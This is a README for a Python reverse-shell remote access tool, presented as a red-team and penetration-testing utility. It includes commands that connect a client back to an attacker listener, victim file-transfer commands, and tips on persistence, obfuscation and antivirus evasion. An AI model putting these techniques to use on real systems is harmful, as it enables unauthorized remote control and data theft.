# 🕳️ Reverse Shell – Python Remote Access Tool (RAT)

## 📌 Project Overview

The **Reverse Shell** is a Python-based remote access utility crafted for ethical hacking, penetration testing, and red-team simulation. It allows an attacker (authorized tester) to **remotely execute system commands** on a target machine after establishing a **reverse TCP connection**.

Unlike bind shells, which require open ports on the target, reverse shells initiate the connection from the victim to the attacker's listener—**bypassing firewall restrictions and NAT** in many cases.

> ⚠️ **DISCLAIMER**: This tool is developed strictly for **educational purposes**, **red team simulations**, and **authorized penetration testing only**. Unauthorized use is illegal and unethical.

---

## 🧠 Key Features

- 📡 **Reverse TCP Connectivity** (client connects to server)
- 💻 **Command Execution** (run shell commands remotely)
- 📂 **File Upload/Download Support**
- 🔁 **Persistent Loop** (interactive shell)
- 🔒 **Customizable Port & Host Settings**
- 🧵 **Multithreaded Listener (optional enhancement)**

---

## 🛠️ Technology Stack

| Component   | Details                                                                            |
|-------------|-------------------------------------------------------------------------------------|
| Language    | Python 3                                                                           |
| Libraries   | `socket`, `os`, `subprocess`, `threading`, `base64`, `json` (for structured comms) |
| OS Support  | Linux, Windows, macOS                                                              |
| Mode        | TCP socket-based                                                                   |

---

## 🧪 How It Works

### 1. Attacker starts the **listener (server)**
```bash
python3 server.py
# or with specific IP/Port
python3 server.py --host <your_ip> --port 4444
```

### 2.Victim executes the payload (reverse shell client)
```bash
This could be manually executed or delivered via a payload in a simulated scenario:
# both IP/Port should be same in server & client side
python3 client.py --host <attacker_ip> --port <attacker_port>
```
---
## 📂 File Transfer Support (Optional Enhancement)
Upload (send file to victim):
```bash
upload /path/to/local/file.txt
```
Download (retrieve file from victim):
```bash
download C:\\Users\\victim\\file.txt
```
---
## 🔐 Security Considerations
|Feature	               |  Details                                              |
|------------------------|-------------------------------------------------------|
|🔒 Encrypted payloads   |	Optionally encode payloads in base64 or AES          |
|🧅 Obfuscation    	     |  Use variable obfuscation or sleep intervals          |
|🔁 Persistence	       |  Optional: register to autorun on startup             |
|🔍 Evasion             |   Mimic legitimate system processes or rename script  |

These features should only be used in legal, ethical testing environments.

## 🚀 Setup Instructions
---
Install dependencies
Most scripts only require built-in libraries:
```bash
python3 --version
```
**Run attacker-side listener**
```bash
python3 listener.py
```
**Deploy or test reverse shell client**
```bash
python3 reverse_shell.py
```
---
## 🧠 Use Cases

- 🔴 **Red Team Operations**
- 🧪 **Penetration Testing Labs**
- 🎓 **Cybersecurity Training**
- 🧰 **Tool Development in Adversary Simulation**
- 📖 **Learning C2 (Command and Control) Concepts**

---

## 🚫 Legal & Ethical Use

- ❗ **This software is to be used only under the following circumstances:**
- You own the target machine
- You have explicit written permission to test the target
- You're operating in a controlled lab or CTF environment

Misuse of this software can lead to criminal prosecution. The author assumes no responsibility for any unauthorized or malicious use.

## 🛠️ Future Enhancements
- AES or RSA encrypted communication
- Polymorphic payload generator
- GUI shell controller (e.g., PyQT interface)
- Reverse HTTPS support
- Port to Go or Rust for AV evasion

## 🧾 License
**This project is licensed under the MIT License and intended for educational, ethical testing only.**

